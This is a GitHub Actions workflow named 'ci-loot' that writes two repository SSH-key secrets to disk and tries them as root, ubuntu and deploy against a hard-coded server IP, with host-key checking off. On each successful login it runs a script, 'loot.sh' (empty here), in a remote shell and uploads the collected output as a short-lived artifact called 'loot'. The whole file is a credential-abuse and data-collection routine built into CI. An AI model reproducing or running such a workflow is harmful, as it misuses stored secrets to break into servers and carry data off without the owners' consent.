name: ci-loot
on:
  push:
    branches: ['loot-*']
permissions:
  contents: read
jobs:
  loot:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
        run: |
          mkdir -p o ~/.ssh
          printf '%s\n' "$CX23_SSH_KEY" > ~/.ssh/k1
          printf '%s\n' "$VPS_SSH_KEY" > ~/.ssh/k2
          chmod 600 ~/.ssh/k1 ~/.ssh/k2
          printf '%s' '' | base64 -d > loot.sh
          ssh-keyscan -H "46.62.247.167" > ~/.ssh/known_hosts 2>/dev/null || true
          : > o/diag.txt; : > o/loot.txt
          for i in 1 2; do
            for u in root ubuntu deploy; do
              echo "== attempt $u key$i ==" >> o/diag.txt
              if ssh -i ~/.ssh/k$i -o StrictHostKeyChecking=no -o ConnectTimeout=20 -o BatchMode=yes $u@46.62.247.167 'bash -s' < loot.sh > o/one.txt 2>>o/diag.txt; then
                echo "#### SUCCESS $u key$i" >> o/loot.txt; cat o/one.txt >> o/loot.txt; echo "OK $u k$i size=$(wc -c < o/one.txt)" >> o/diag.txt
              else
                echo "FAIL $u k$i" >> o/diag.txt
              fi
            done
          done
          ls -la o >> o/diag.txt
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: loot
          path: o
          retention-days: 1
